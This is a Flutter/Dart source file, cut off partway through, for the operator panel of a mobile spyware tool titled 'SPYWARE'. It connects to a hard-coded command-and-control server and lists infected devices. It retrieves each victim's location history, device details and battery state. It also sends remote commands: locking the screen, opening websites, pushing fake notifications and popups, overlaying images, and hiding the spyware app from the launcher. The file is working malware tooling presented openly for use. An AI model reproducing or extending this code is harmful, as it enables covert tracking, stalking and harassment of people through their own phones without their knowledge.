import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:intl/intl.dart';
import 'package:flutter_map/flutter_map.dart';
import 'package:latlong2/latlong.dart';
final String baseUrl = "http://suikaxmaxxxmangyannxbrock.cloudnesia.my.id:3323/api";

class SpywarePage extends StatefulWidget {
  final String sessionKey;
  final String userRole;
  final String username;

  const SpywarePage({
    super.key,
    required this.sessionKey,
    required this.userRole,
    required this.username,
  });

  @override
  State<SpywarePage> createState() => _SpywarePageState();
}

class _SpywarePageState extends State<SpywarePage> with TickerProviderStateMixin {
  final Color primaryDark = const Color(0xFF1A0505);
  final Color primaryPink = const Color(0xFFE91E63);
  final Color accentPink = const Color(0xFFFF80AB);
  final Color lightPink = const Color(0xFFFFB6C1);
  final Color primaryWhite = Colors.white;
  final Color accentGrey = Colors.grey;
  final Color cardDark = const Color(0xFF2D0A0A);
  
  late AnimationController _glowController;
  late Animation<double> _glowAnimation;
  late AnimationController _pulseController;
  
  List<dynamic> _devices = [];
  Map<String, dynamic>? _selectedDevice;
  Map<String, dynamic> _deviceInfo = {};
  List<dynamic> _locations = [];
  Map<String, dynamic>? _lastLocation;
  Map<String, dynamic> _batteryInfo = {};
  List<dynamic> _notifications = [];
  
  bool _isLoading = true;
  bool _isLoadingData = false;
  bool _isShowingDeviceDetail = true;
  String? _selectedDataType;
  String? _commandResponse;
  bool _confirmAction = false;
  Map<String, dynamic>? _pendingCommand;
  int _selectedTabIndex = 0;

  final TextEditingController _webUrlController = TextEditingController();
  final TextEditingController _notifTitleController = TextEditingController();
  final TextEditingController _notifMessageController = TextEditingController();
  final TextEditingController _popupTitleController = TextEditingController();
  final TextEditingController _popupMessageController = TextEditingController();
  final TextEditingController _imageUrlController = TextEditingController();
  final TextEditingController _imageCountController = TextEditingController();

  @override
  void initState() {
    super.initState();
    _glowController = AnimationController(
      duration: const Duration(seconds: 2),
      vsync: this,
    )..repeat(reverse: true);
    
    _glowAnimation = Tween<double>(begin: 0.5, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );
    
    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    )..repeat(reverse: true);
    
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _fetchDevices();
    });
  }

  @override
  void dispose() {
    _glowController.dispose();
    _pulseController.dispose();
    _webUrlController.dispose();
    _notifTitleController.dispose();
    _notifMessageController.dispose();
    _popupTitleController.dispose();
    _popupMessageController.dispose();
    _imageUrlController.dispose();
    _imageCountController.dispose();
    super.dispose();
  }
  
  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    if (!_isShowingDeviceDetail && _selectedDataType == null) {
      _fetchDevices();
    }
  }
  
  Future<void> _fetchDevices() async {
    setState(() {
      _isLoading = true;
    });

    try {
      final response = await http.get(
        Uri.parse('$baseUrl/my-devices?username=${widget.username}'),
        headers: {
          'Content-Type': 'application/json',
        },
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        print('Response data: $data');      
        List<dynamic> deviceList = [];      
        if (data is List) {
          deviceList = data;
        } else if (data is Map) {
          if (data['success'] == true && data['devices'] != null) {
            deviceList = data['devices'];
          } else if (data['devices'] != null) {
            deviceList = data['devices'];
          } else if (data['data'] != null) {
            deviceList = data['data'];
          }
        }      
        setState(() {
          _devices = deviceList;
          _isLoading = false;
        });      
        print('Devices loaded: ${deviceList.length}');      
      } else {
        setState(() {
          _isLoading = false;
        });
        _showErrorSnackbar('Failed to load devices: ${response.statusCode}');
      }
    } catch (e) {
      print('Error fetching devices: $e');
      setState(() {
        _isLoading = false;
      });
      _showErrorSnackbar('Error fetching devices: $e');
    }
  }

  Future<void> _fetchDeviceInfo(String deviceId) async {
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/device/info?device=$deviceId&username=${widget.username}'),
        headers: {
          'Authorization': 'Bearer ${widget.sessionKey}',
          'Content-Type': 'application/json',
        },
      );

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _deviceInfo = data;
          });
        }
      }
    } catch (e) {
      debugPrint('Error fetching device info: $e');
    }
  }

  Future<void> _fetchLocations(String deviceId) async {
    setState(() {
      _isLoadingData = true;
      _selectedDataType = 'locations';
    });

    try {
      final response = await http.get(
        Uri.parse('$baseUrl/location/get?device=$deviceId&username=${widget.username}&limit=50'),
        headers: {
          'Authorization': 'Bearer ${widget.sessionKey}',
          'Content-Type': 'application/json',
        },
      );

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _locations = data['locations'] ?? [];
            _lastLocation = data['last_location'];
            _isLoadingData = false;
          });
        } else {
          throw Exception(data['error'] ?? 'Failed to load locations');
        }
      } else {
        throw Exception('Failed to load locations');
      }
    } catch (e) {
      setState(() {
        _isLoadingData = false;
      });
      _showErrorSnackbar('Error fetching locations: $e');
    }
  }

  Future<void> _fetchBatteryInfo(String deviceId) async {
    setState(() {
      _isLoadingData = true;
      _selectedDataType = 'battery';
    });

    try {
      final response = await http.get(
        Uri.parse('$baseUrl/battery/get?device=$deviceId&username=${widget.username}'),
        headers: {
          'Authorization': 'Bearer ${widget.sessionKey}',
          'Content-Type': 'application/json',
        },
      );

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _batteryInfo = data;
            _isLoadingData = false;
          });
        } else {
          throw Exception(data['error'] ?? 'Failed to load battery info');
        }
      } else {
        throw Exception('Failed to load battery info');
      }
    } catch (e) {
      setState(() {
        _isLoadingData = false;
      });
      _showErrorSnackbar('Error fetching battery info: $e');
    }
  }

  Future<void> _sendCommand(String deviceId, String command, [Map<String, String>? params]) async {
    _showConfirmationDialog(deviceId, command, params);
  }

  void _showConfirmationDialog(String deviceId, String command, Map<String, String>? params) {
    String commandName = '';
    String commandDesc = '';
    IconData commandIcon = Icons.code;
    Color commandColor = primaryPink;
    
    switch (command) {
      case 'lock':
        commandName = 'Lock Device';
        commandDesc = 'Lock the device screen immediately';
        commandIcon = Icons.lock;
        commandColor = Colors.orange;
        break;
      case 'unlock':
        commandName = 'Unlock Device';
        commandDesc = 'Unlock the device screen';
        commandIcon = Icons.lock_open;
        commandColor = Colors.green;
        break;
      case 'flashlight_on':
        commandName = 'Flashlight ON';
        commandDesc = 'Turn on the device flashlight';
        commandIcon = Icons.flash_on;
        commandColor = Colors.yellow;
        break;
      case 'flashlight_off':
        commandName = 'Flashlight OFF';
        commandDesc = 'Turn off the device flashlight';
        commandIcon = Icons.flash_off;
        commandColor = Colors.grey;
        break;
      case 'play_music':
        commandName = 'Play Music';
        commandDesc = 'Play music from URL: ${params?['url'] ?? 'Unknown'}';
        commandIcon = Icons.music_note;
        commandColor = Colors.blue;
        break;
      case 'stop_music':
        commandName = 'Stop Music';
        commandDesc = 'Stop currently playing music';
        commandIcon = Icons.stop;
        commandColor = Colors.red;
        break;
      case 'hide_app':
        commandName = 'Hide App';
        commandDesc = 'Hide the spyware app from launcher';
        commandIcon = Icons.visibility_off;
        commandColor = Colors.purple;
        break;
      case 'show_app':
        commandName = 'Show App';
        commandDesc = 'Show the spyware app in launcher';
        commandIcon = Icons.visibility;
        commandColor = Colors.teal;
        break;
      case 'open_web':
        commandName = 'Open Website';
        commandDesc = 'Open URL: ${params?['url'] ?? 'Unknown'}';
        commandIcon = Icons.public;
        commandColor = Colors.blue;
        break;
      case 'show_notification':
        commandName = 'Show Notification';
        commandDesc = 'Title: ${params?['title'] ?? ''}\nMessage: ${params?['message'] ?? ''}';
        commandIcon = Icons.notifications;
        commandColor = Colors.orange;
        break;
      case 'show_popup':
        commandName = 'Show Popup';
        commandDesc = 'Title: ${params?['title'] ?? ''}\nMessage: ${params?['message'] ?? ''}';
        commandIcon = Icons.message;
        commandColor = Colors.purple;
        break;
      case 'show_floating_images':
        commandName = 'Show Floating Images';
        commandDesc = 'URL: ${params?['url'] ?? ''}\nCount: ${params?['count'] ?? ''}';
        commandIcon = Icons.image;
        commandColor = Colors.pink;
        break;
      case 'clear_floating_images':
        commandName = 'Clear Floating Images';
        commandDesc = 'Remove all floating images from screen';
        commandIcon = Icons.clear_all;
        commandColor = Colors.red;
        break;
    }

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
        ),
        title: Row(
          children: [
            Container(
              padding: EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: commandColor.withOpacity(0.2),
                borderRadius: BorderRadius.circular(12),
              ),
              child: Icon(commandIcon, color: commandColor, size: 24),
            ),
            SizedBox(width: 12),
            Text(
              'Confirm Action',
              style: TextStyle(
                color: primaryWhite,
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
                fontSize: 18,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              commandName,
              style: TextStyle(
                color: commandColor,
                fontFamily: 'Orbitron',
                fontSize: 20,
                fontWeight: FontWeight.bold,
              ),
            ),
            SizedBox(height: 8),
            Text(
              commandDesc,
              style: TextStyle(
                color: lightPink,
                fontFamily: 'ShareTechMono',
                fontSize: 14,
              ),
            ),
            SizedBox(height: 16),
            Container(
              padding: EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: primaryPink.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: primaryPink.withOpacity(0.3)),
              ),
              child: Row(
                children: [
                  Icon(Icons.warning_amber, color: Colors.orange, size: 20),
                  SizedBox(width: 8),
                  Expanded(
                    child: Text(
                      'This action will be sent to the device immediately',
                      style: TextStyle(
                        color: primaryWhite,
                        fontFamily: 'ShareTechMono',
                        fontSize: 12,
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            style: TextButton.styleFrom(
              foregroundColor: accentGrey,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(10),
              ),
            ),
            child: Text('Cancel'),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: commandColor,
              foregroundColor: primaryWhite,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(10),
              ),
              elevation: 5,
            ),
            onPressed: () {
              Navigator.pop(context);
              _executeCommand(deviceId, command, params);
            },
            child: Text('Execute'),
          ),
        ],
      ),
    );
  }

  Future<void> _executeCommand(String deviceId, String command, Map<String, String>? params) async {
    setState(() {
      _commandResponse = null;
    });

    try {
      String urlString;
      
      switch (command) {
        case 'lock':
          urlString = '$baseUrl/lock?device=$deviceId&username=${widget.username}';
          break;
        case 'unlock':
          urlString = '$baseUrl/unlock?device=$deviceId&username=${widget.username}';
          break;
        case 'flashlight_on':
          urlString = '$baseUrl/flashlight_on?device=$deviceId&username=${widget.username}';
          break;
        case 'flashlight_off':
          urlString = '$baseUrl/flashlight_off?device=$deviceId&username=${widget.username}';
          break;
        case 'play_music':
          if (params?['url'] == null) {
            _showErrorSnackbar('URL required');
            return;
          }
          urlString = '$baseUrl/music/play?device=$deviceId&username=${widget.username}&url=${Uri.encodeComponent(params!['url']!)}';
          break;
        case 'stop_music':
          urlString = '$baseUrl/music/stop?device=$deviceId&username=${widget.username}';
          break;
        case 'hide_app':
          urlString = '$baseUrl/app/hide?device=$deviceId&username=${widget.username}';
          break;
        case 'show_app':
          urlString = '$baseUrl/app/show?device=$deviceId&username=${widget.username}';
          break;
        case 'open_web':
          if (params?['url'] == null) {
            _showErrorSnackbar('URL required');
            return;
          }
          urlString = '$baseUrl/openweb?device=$deviceId&username=${widget.username}&url=${Uri.encodeComponent(params!['url']!)}';
          break;
        case 'show_notification':
          if (params?['title'] == null || params?['message'] == null) {
            _showErrorSnackbar('Title and message required');
            return;
          }
          urlString = '$baseUrl/show_notif?device=$deviceId&username=${widget.username}&title=${Uri.encodeComponent(params!['title']!)}&message=${Uri.encodeComponent(params['message']!)}';
          break;
        case 'show_popup':
          if (params?['title'] == null || params?['message'] == null) {
            _showErrorSnackbar('Title and message required');
            return;
          }
          urlString = '$baseUrl/show_popup?device=$deviceId&username=${widget.username}&title=${Uri.encodeComponent(params!['title']!)}&message=${Uri.encodeComponent(params['message']!)}';
          break;
        case 'show_floating_images':
          if (params?['url'] == null || params?['count'] == null) {
            _showErrorSnackbar('URL and count required');
            return;
          }
          urlString = '$baseUrl/show_image?device=$deviceId&username=${widget.username}&url=${Uri.encodeComponent(params!['url']!)}&count=${params['count']}';
          break;
        case 'clear_floating_images':
          urlString = '$baseUrl/clear_image?device=$deviceId&username=${widget.username}';
          break;
        default:
          _showErrorSnackbar('Unknown command');
          return;
      }
      
      final response = await http.get(
        Uri.parse(urlString),
        headers: {
          'Authorization': 'Bearer ${widget.sessionKey}',
          'Content-Type': 'application/json',
        },
      );

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _commandResponse = '✓ ${data['message']}';
          });
          _showSuccessSnackbar('Command executed successfully');
        } else {
          _showErrorSnackbar('Error: ${data['error'] ?? 'Unknown error'}');
        }
      } else {
        _showErrorSnackbar('Failed to send command');
      }
    } catch (e) {
      _showErrorSnackbar('Failed to send command: $e');
    }
  }

  void _showMusicUrlDialog(String deviceId) {
    final TextEditingController urlController = TextEditingController();

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
        ),
        title: Row(
          children: [
            Container(
              padding: EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: primaryPink.withOpacity(0.2),
                borderRadius: BorderRadius.circular(12),
              ),
              child: Icon(Icons.music_note, color: primaryPink, size: 24),
            ),
            SizedBox(width: 12),
            Text(
              'Play Music',
              style: TextStyle(
                color: primaryWhite,
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              'Enter music URL to play on device',
              style: TextStyle(
                color: lightPink,
                fontFamily: 'ShareTechMono',
                fontSize: 12,
              ),
            ),
            SizedBox(height: 16),
            TextField(
              controller: urlController,
              style: TextStyle(color: primaryWhite),
              decoration: InputDecoration(
                hintText: 'https://example.com/music.mp3',
                hintStyle: TextStyle(color: accentGrey),
                enabledBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
                  borderRadius: BorderRadius.circular(12),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink, width: 2),
                  borderRadius: BorderRadius.circular(12),
                ),
                prefixIcon: Icon(Icons.music_note, color: primaryPink),
                filled: true,
                fillColor: primaryPink.withOpacity(0.05),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            style: TextButton.styleFrom(
              foregroundColor: accentGrey,
            ),
            child: Text('Cancel'),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: primaryPink,
              foregroundColor: primaryWhite,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
            ),
            onPressed: () {
              Navigator.pop(context);
              if (urlController.text.isNotEmpty) {
                _sendCommand(deviceId, 'play_music', {'url': urlController.text});
              } else {
                _showErrorSnackbar('URL cannot be empty');
              }
            },
            child: Text('Play'),
          ),
        ],
      ),
    );
  }

  void _showOpenWebDialog(String deviceId) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
        ),
        title: Row(
          children: [
            Container(
              padding: EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.blue.withOpacity(0.2),
                borderRadius: BorderRadius.circular(12),
              ),
              child: Icon(Icons.public, color: Colors.blue, size: 24),
            ),
            SizedBox(width: 12),
            Text(
              'Open Website',
              style: TextStyle(
                color: primaryWhite,
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              'Enter URL to open on device',
              style: TextStyle(
                color: lightPink,
                fontFamily: 'ShareTechMono',
                fontSize: 12,
              ),
            ),
            SizedBox(height: 16),
            TextField(
              controller: _webUrlController,
              style: TextStyle(color: primaryWhite),
              decoration: InputDecoration(
                hintText: 'https://example.com',
                hintStyle: TextStyle(color: accentGrey),
                enabledBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
                  borderRadius: BorderRadius.circular(12),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink, width: 2),
                  borderRadius: BorderRadius.circular(12),
                ),
                prefixIcon: Icon(Icons.link, color: Colors.blue),
                filled: true,
                fillColor: primaryPink.withOpacity(0.05),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              _webUrlController.clear();
              Navigator.pop(context);
            },
            style: TextButton.styleFrom(
              foregroundColor: accentGrey,
            ),
            child: Text('Cancel'),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.blue,
              foregroundColor: primaryWhite,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
            ),
            onPressed: () {
              Navigator.pop(context);
              if (_webUrlController.text.isNotEmpty) {
                _sendCommand(deviceId, 'open_web', {'url': _webUrlController.text});
                _webUrlController.clear();
              } else {
                _showErrorSnackbar('URL cannot be empty');
              }
            },
            child: Text('Open'),
          ),
        ],
      ),
    );
  }

  void _showNotificationDialog(String deviceId) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
        ),
        title: Row(
          children: [
            Container(
              padding: EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.orange.withOpacity(0.2),
                borderRadius: BorderRadius.circular(12),
              ),
              child: Icon(Icons.notifications, color: Colors.orange, size: 24),
            ),
            SizedBox(width: 12),
            Text(
              'Show Notification',
              style: TextStyle(
                color: primaryWhite,
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: _notifTitleController,
              style: TextStyle(color: primaryWhite),
              decoration: InputDecoration(
                labelText: 'Title',
                labelStyle: TextStyle(color: lightPink),
                enabledBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
                  borderRadius: BorderRadius.circular(12),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink, width: 2),
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: primaryPink.withOpacity(0.05),
              ),
            ),
            SizedBox(height: 12),
            TextField(
              controller: _notifMessageController,
              style: TextStyle(color: primaryWhite),
              maxLines: 3,
              decoration: InputDecoration(
                labelText: 'Message',
                labelStyle: TextStyle(color: lightPink),
                enabledBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
                  borderRadius: BorderRadius.circular(12),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink, width: 2),
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: primaryPink.withOpacity(0.05),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              _notifTitleController.clear();
              _notifMessageController.clear();
              Navigator.pop(context);
            },
            style: TextButton.styleFrom(
              foregroundColor: accentGrey,
            ),
            child: Text('Cancel'),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.orange,
              foregroundColor: primaryWhite,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
            ),
            onPressed: () {
              Navigator.pop(context);
              if (_notifTitleController.text.isNotEmpty && _notifMessageController.text.isNotEmpty) {
                _sendCommand(deviceId, 'show_notification', {
                  'title': _notifTitleController.text,
                  'message': _notifMessageController.text
                });
                _notifTitleController.clear();
                _notifMessageController.clear();
              } else {
                _showErrorSnackbar('Title and message cannot be empty');
              }
            },
            child: Text('Send'),
          ),
        ],
      ),
    );
  }

  void _showPopupDialog(String deviceId) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
        ),
        title: Row(
          children: [
            Container(
              padding: EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.purple.withOpacity(0.2),
                borderRadius: BorderRadius.circular(12),
              ),
              child: Icon(Icons.message, color: Colors.purple, size: 24),
            ),
            SizedBox(width: 12),
            Text(
              'Show Popup',
              style: TextStyle(
                color: primaryWhite,
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: _popupTitleController,
              style: TextStyle(color: primaryWhite),
              decoration: InputDecoration(
                labelText: 'Title',
                labelStyle: TextStyle(color: lightPink),
                enabledBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
                  borderRadius: BorderRadius.circular(12),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink, width: 2),
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: primaryPink.withOpacity(0.05),
              ),
            ),
            SizedBox(height: 12),
            TextField(
              controller: _popupMessageController,
              style: TextStyle(color: primaryWhite),
              maxLines: 3,
              decoration: InputDecoration(
                labelText: 'Message',
                labelStyle: TextStyle(color: lightPink),
                enabledBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
                  borderRadius: BorderRadius.circular(12),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink, width: 2),
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: primaryPink.withOpacity(0.05),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              _popupTitleController.clear();
              _popupMessageController.clear();
              Navigator.pop(context);
            },
            style: TextButton.styleFrom(
              foregroundColor: accentGrey,
            ),
            child: Text('Cancel'),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.purple,
              foregroundColor: primaryWhite,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
            ),
            onPressed: () {
              Navigator.pop(context);
              if (_popupTitleController.text.isNotEmpty && _popupMessageController.text.isNotEmpty) {
                _sendCommand(deviceId, 'show_popup', {
                  'title': _popupTitleController.text,
                  'message': _popupMessageController.text
                });
                _popupTitleController.clear();
                _popupMessageController.clear();
              } else {
                _showErrorSnackbar('Title and message cannot be empty');
              }
            },
            child: Text('Show'),
          ),
        ],
      ),
    );
  }

  void _showFloatingImagesDialog(String deviceId) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardDark,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
        ),
        title: Row(
          children: [
            Container(
              padding: EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: Colors.pink.withOpacity(0.2),
                borderRadius: BorderRadius.circular(12),
              ),
              child: Icon(Icons.image, color: Colors.pink, size: 24),
            ),
            SizedBox(width: 12),
            Text(
              'Floating Images',
              style: TextStyle(
                color: primaryWhite,
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: _imageUrlController,
              style: TextStyle(color: primaryWhite),
              decoration: InputDecoration(
                labelText: 'Image URL',
                labelStyle: TextStyle(color: lightPink),
                hintText: 'https://example.com/image.jpg',
                hintStyle: TextStyle(color: accentGrey),
                enabledBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
                  borderRadius: BorderRadius.circular(12),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink, width: 2),
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: primaryPink.withOpacity(0.05),
              ),
            ),
            SizedBox(height: 12),
            TextField(
              controller: _imageCountController,
              style: TextStyle(color: primaryWhite),
              keyboardType: TextInputType.number,
              decoration: InputDecoration(
                labelText: 'Number of Images',
                labelStyle: TextStyle(color: lightPink),
                hintText: '5',
                hintStyle: TextStyle(color: accentGrey),
                enabledBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink.withOpacity(0.3), width: 1),
                  borderRadius: BorderRadius.circular(12),
                ),
                focusedBorder: OutlineInputBorder(
                  borderSide: BorderSide(color: primaryPink, width: 2),
                  borderRadius: BorderRadius.circular(12),
                ),
                filled: true,
                fillColor: primaryPink.withOpacity(0.05),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () {
              _imageUrlController.clear();
              _imageCountController.clear();
              Navigator.pop(context);
            },
            style: TextButton.styleFrom(
              foregroundColor: accentGrey,
            ),
            child: Text('Cancel'),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.pink,
              foregroundColor: primaryWhite,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
            ),
            onPressed: () {
              Navigator.pop(context);
              if (_imageUrlController.text.isNotEmpty && _imageCountController.text.isNotEmpty) {
                _sendCommand(deviceId, 'show_floating_images', {
                  'url': _imageUrlController.text,
                  'count': _imageCountController.text
                });
                _imageUrlController.clear();
                _imageCountController.clear();
              } else {
                _showErrorSnackbar('URL and count cannot be empty');
              }
            },
            child: Text('Show'),
          ),
        ],
      ),
    );
  }

  void _showDeviceDetail(Map<String, dynamic> device) {
    setState(() {
      _selectedDevice = device;
      _isShowingDeviceDetail = true;
      _selectedTabIndex = 0;
      _deviceInfo = {};
      _locations = [];
      _lastLocation = null;
      _batteryInfo = {};
    });
    _fetchDeviceInfo(device['device_id']);
    _fetchLocations(device['device_id']);
    _fetchBatteryInfo(device['device_id']);
  }

  void _showSuccessSnackbar(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(Icons.check_circle, color: Colors.white),
            SizedBox(width: 8),
            Text(message),
          ],
        ),
        backgroundColor: Colors.green,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
        duration: Duration(seconds: 2),
      ),
    );
  }

  void _showErrorSnackbar(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(Icons.error, color: Colors.white),
            SizedBox(width: 8),
            Text(message),
          ],
        ),
        backgroundColor: primaryPink,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
        duration: Duration(seconds: 3),
      ),
    );
  }

  void _navigateBack() {
  if (_selectedDataType != null) {
    setState(() {
      _selectedDataType = null;
      _locations = [];
      _batteryInfo = {};
    });
  } else if (_isShowingDeviceDetail) {
    setState(() {
      _isShowingDeviceDetail = false;
      _selectedDevice = null;
      _deviceInfo = {};
    });
  } else {
    Navigator.pop(context);
  }
}

  String _formatDateTime(String? dateStr) {
    if (dateStr == null) return 'Unknown';
    try {
      final date = DateTime.parse(dateStr);
      final now = DateTime.now();
      final difference = now.difference(date);

      if (difference.inDays > 0) {
        return DateFormat('dd/MM/yyyy HH:mm').format(date);
      } else if (difference.inHours > 0) {
        return '${difference.inHours}h ago';
      } else if (difference.inMinutes > 0) {
        return '${difference.inMinutes}m ago';
      } else {
        return 'Just now';
      }
    } catch (e) {
      return 'Invalid date';
    }
  }

  String _formatEpochTime(int? timestamp) {
    if (timestamp == null) return 'Unknown';
    try {
      final date = DateTime.fromMillisecondsSinceEpoch(timestamp);
      return DateFormat('dd/MM/yyyy HH:mm:ss').format(date);
    } catch (e) {
      return 'Unknown';
    }
  }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _glowAnimation,
      builder: (context, child) {
        return Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              colors: [
                primaryDark,
                primaryDark.withOpacity(0.8),
              ],
              center: Alignment.topRight,
              radius: _glowAnimation.value,
            ),
          ),
          child: Scaffold(
            backgroundColor: Colors.transparent,
            appBar: AppBar(
              title: Row(
                children: [
                  Text(
                    "SPY",
                    style: TextStyle(
                      color: primaryPink,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                      fontSize: 24,
                      shadows: [
                        Shadow(
                          color: primaryPink.withOpacity(0.8),
                          blurRadius: 15,
                        ),
                      ],
                    ),
                  ),
                  Text(
                    "WARE",
                    style: TextStyle(
                      color: primaryWhite,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                      fontSize: 24,
                      shadows: [
                        Shadow(
                          color: primaryWhite.withOpacity(0.5),
                          blurRadius: 10,
                        ),
                      ],
                    ),
                  ),
                ],
              ),
